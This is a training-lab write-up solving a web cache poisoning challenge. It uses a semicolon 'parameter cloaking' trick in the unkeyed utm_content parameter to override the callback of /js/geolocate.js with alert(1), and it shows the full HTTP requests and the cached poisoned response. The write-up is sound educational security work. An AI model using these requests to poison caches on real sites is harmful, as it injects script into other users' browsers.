## Parameter cloaking

This lab is vulnerable to web cache poisoning because it excludes a certain parameter from the cache key. There is also inconsistent parameter parsing between the cache and the back-end. A user regularly visits this site's home page using Chrome.

To solve the lab, use the parameter cloaking technique to poison the cache with a response that executes alert(1) in the victim's browser.

Hint :

The website excludes a certain UTM analytics parameter

## Notes

- Possibility to leave a comment
- X-Cache Header
- Cache-Control Header
- reflected word in response
- `X-Cache-Key : /$$`
- /js/geolocate.js?callback=en

## Resume

1. Find cached request  
2. Identify utm_content exclusion from cache key  
3. Detect parameter cloaking via semicolon trick  
4. Exploit callback override via utm_content  
5. Poison cache with alert(1)  
6. Trigger victim execution  

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response :

```http
GET / HTTP/2
Host: 0a37004b03068c2081dd587f00ac0041.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 8472
```

The next step is to confirm the cache key behavior :

```http
GET / HTTP/2
Host: 0a37004b03068c2081dd587f00ac0041.web-security-academy.net
Pragma: x-get-cache-key
```

```http
HTTP/2 200 OK
X-Cache-Key: /$$
```

This confirms that certain UTM parameters are excluded from the cache key.

Next, we identify `utm_content` as an unkeyed parameter.

We verify parameter cloaking behavior using a semicolon:

```http
GET /?utm_content=aaa;test=1 HTTP/2
Host: 0a37004b03068c2081dd587f00ac0041.web-security-academy.net
```

We observe that:
- `utm_content` is still reflected
- but `;` allows additional parameters to be injected and ignored by cache keying rules

This confirms parameter cloaking via semicolon parsing inconsistency.

Next, we analyze the vulnerable script import:

```http
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a37004b03068c2081dd587f00ac0041.web-security-academy.net
```

We confirm:
- callback parameter is reflected
- but normally keyed, so not directly poisonable

Now we exploit parameter cloaking by appending a second callback parameter inside the unkeyed UTM parameter:

```http
GET /js/geolocate.js?callback=setCountryCookie&utm_content=foo;callback=alert(1) HTTP/2
Host: 0a37004b03068c2081dd587f00ac0041.web-security-academy.net
Referer: https://0a37004b03068c2081dd587f00ac0041.web-security-academy.net/
```

We observe:
- cache key only includes the first callback
- but backend uses the second callback value
- response becomes:

```javascript
alert(1)({"country":"United Kingdom"})
```

This confirms parameter cloaking allows overriding behavior without affecting cache key.

We then replay the request until we obtain:
- `X-Cache: hit`
- poisoned response stored in cache

Finally, we refresh the home page and confirm that `/js/geolocate.js` is loaded by the browser and executes `alert(1)`.

The lab is solved when the victim visits any page importing `/js/geolocate.js`.